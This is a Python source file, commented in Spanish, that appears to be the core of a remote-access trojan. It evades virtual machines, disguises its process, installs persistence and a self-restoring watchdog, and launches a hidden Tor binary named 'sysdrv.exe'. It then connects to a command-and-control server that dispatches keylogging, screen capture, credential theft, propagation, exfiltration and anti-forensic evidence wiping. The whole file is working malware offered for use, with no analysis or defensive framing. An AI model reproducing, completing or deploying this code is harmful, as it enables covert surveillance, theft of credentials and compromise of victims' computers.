import os
import sys
import threading
import time
import subprocess

from core.config import C2_HOST, C2_PORT
from core.comms import setup_socket_client, recv_encrypted, send_encrypted
from core.anti_vm import kill_if_vm
from core.logger import log_event

# Integración de nuevos módulos avanzados
from modules.camouflage import camufla_nombre_proceso, randomize_bin_name
from modules.persistence import persist_multicopy
from modules.watcher import start_watcher
from modules.file_protect import proteger_archivo_extremo
from modules.secure_kill import run as secure_kill_run
from modules.antiforensic import limpiar_evidencia

# Módulos funcionales clásicos
from modules import keylogger, screengrab, persistence, propagator, credentials, exfiltrator

MODULES = {
    "keylogger": keylogger,
    "screengrab": screengrab,
    "persistence": persistence,
    "propagator": propagator,
    "credentials": credentials,
    "exfiltrator": exfiltrator,
    "secure_kill": secure_kill_run,     # permite kill seguro por comando
    "antiforensic": lambda cmd, *args: limpiar_evidencia() if cmd == "clean" else "[!] Comando no soportado."
}

# Referencia global para el proceso TOR
tor_proc = None

def launch_tor_embedded():
    global tor_proc
    exe_path = os.path.join(os.path.dirname(__file__), "sysdrv.exe")
    torrc_path = os.path.join(os.path.dirname(__file__), "torrc.txt")
    with open(torrc_path, "w") as f:
        f.write("SocksPort 9050\nLog notice stdout\n")
    try:
        creationflags = subprocess.CREATE_NO_WINDOW if hasattr(subprocess, 'CREATE_NO_WINDOW') else 0
    except AttributeError:
        creationflags = 0
    tor_proc = subprocess.Popen(
        [exe_path, "-f", torrc_path],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        creationflags=creationflags
    )
    time.sleep(10)  # Espera a que TOR esté listo

def kill_tor():
    global tor_proc
    if tor_proc and tor_proc.poll() is None:
        tor_proc.terminate()
        try:
            tor_proc.wait(timeout=5)
        except Exception:
            pass
        tor_proc = None

def handle_command(cmd, args):
    try:
        if "." in cmd:
            modulo, subcmd = cmd.split(".", 1)
            if modulo in MODULES:
                # Integración especial para secure_kill y antiforensic
                if modulo == "secure_kill":
                    resp = MODULES[modulo](subcmd, *args)
                    # Si kill fue exitoso, limpia y sale
                    if resp and resp.startswith("[+]"):
                        kill_tor()
                        limpiar_evidencia()
                        sys.exit(0)
                    return resp
                elif modulo == "antiforensic":
                    return MODULES[modulo](subcmd, *args)
                else:
                    return MODULES[modulo].run(subcmd, *args)
            else:
                return f"[!] Módulo no soportado: {modulo}"
        elif cmd == "exit":
            log_event("EXIT", "Cierre por C2")
            kill_tor()
            sys.exit(0)
        elif cmd == "info":
            import platform
            return f"{platform.node()} - {platform.system()} {platform.release()}"
        else:
            return f"Comando no reconocido: {cmd}"
    except Exception as e:
        return f"Error: {e}"

def main_loop(sock):
    while True:
        data = recv_encrypted(sock)
        if not data:
            break
        try:
            line = data.decode(errors="ignore")
            if not line:
                continue
            parts = line.strip().split()
            cmd, *args = parts
            result = handle_command(cmd, args)
            send_encrypted(sock, str(result).encode())
        except Exception as e:
            send_encrypted(sock, f"Error: {e}".encode())
    sock.close()
    kill_tor()

def main():
    # 1. Anti-VM y sandbox
    kill_if_vm()

    # 2. Camuflaje total del proceso
    camufla_nombre_proceso()
    randomize_bin_name()

    # 3. Persistencia multinivel + autocopia
    persist_multicopy()

    # 4. Protección extrema de archivos
    from modules.persistence import get_system_paths
    for path in get_system_paths():
        if os.path.exists(path):
            proteger_archivo_extremo(path)

    # 5. Watchdog/Autoregeneración
    start_watcher()

    # 6. Lanzar TOR embebido
    launch_tor_embedded()

    # 7. Bucle de conexión C2
    while True:
        try:
            sock = setup_socket_client(C2_HOST, C2_PORT)
            log_event("CONNECT", f"Conectado a {C2_HOST}:{C2_PORT}")
            main_loop(sock)
        except Exception as e:
            log_event("RECONNECT", f"Fallo conexión: {e}")
            time.sleep(10)

if __name__ == "__main__":
    main()



